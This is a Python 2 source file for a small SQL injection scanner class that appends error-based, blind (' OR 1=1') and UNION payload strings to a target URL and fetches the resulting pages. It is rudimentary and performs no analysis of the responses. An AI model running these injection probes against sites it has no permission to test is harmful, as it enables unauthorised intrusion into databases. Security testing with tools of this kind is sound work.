import urllib2
from bs4 import BeautifulSoup
from lib.core.settings import RANDOM_COMMON_COLUMN


class SQLiScanner(object):

    """ Scan a URL for SQL injection possibilities. """

    def __init__(self, url):
        self.url = url
        self.error_syntax = ["'", "--", ';', '"', "/*", "'/*", "'--", '"--', "';", '";', '`']
        self.blind_syntax = [" AND 13=13", " OR 13=13", " AND 1=1", " OR 1=1"]
        self.union_syntax = [" union false {}".format(RANDOM_COMMON_COLUMN.strip()), " UNION {}".format(RANDOM_COMMON_COLUMN.strip())]

    def add_error_based_to_url(self):
        """ Add SQL closing syntax to the URL
        >>> print(self.add_blind_based_to_url())
        http://example.com/php?id=2'
        http://example.com/php?id=2--
        ..."""
        error_based_injection = []
        for syntax in self.error_syntax:
            error_based_injection.append(self.url + syntax)

        return error_based_injection

    def add_blind_based_to_url(self):
        """ Add blind based injection syntax to the URL
        http://example.com/php?id=2 AND 13=13
        http://example.com/php?id=2 OR 13=13
        ..."""
        blind_based_injection = []
        for blind in self.blind_syntax:
            blind_based_injection.append(self.url + blind)

        return blind_based_injection

    def add_union_based_injection(self):
        """ Add union based injection syntax to the URL using random common columns
        http://example.com/php?id=2 union false bio
        http://example.com/php?id=2 UNION bio """
        union_based_injection = []
        for union in self.union_syntax:
            union_based_injection.append(self.url + union)

        return union_based_injection

    def attempt_connection_to_urls(self):
        print("Starting error based search..")
        for url in self.add_error_based_to_url():
            data = urllib2.urlopen(url).read()
            soup = BeautifulSoup(data, 'html.parser')
            print soup

